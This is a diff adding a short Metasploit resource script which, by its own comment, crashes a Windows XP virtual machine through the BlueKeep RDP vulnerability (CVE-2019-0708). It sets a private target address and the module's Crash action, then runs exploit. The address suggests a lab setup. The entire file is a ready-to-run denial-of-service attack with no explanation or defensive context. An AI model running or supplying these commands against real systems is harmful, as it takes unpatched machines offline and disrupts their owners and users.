@@ -1,0 +1,5 @@
+#This script crashes a Windows XP VM using bluekeep
+use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+set RHOSTS 192.168.56.123
+set action Crash
+exploit
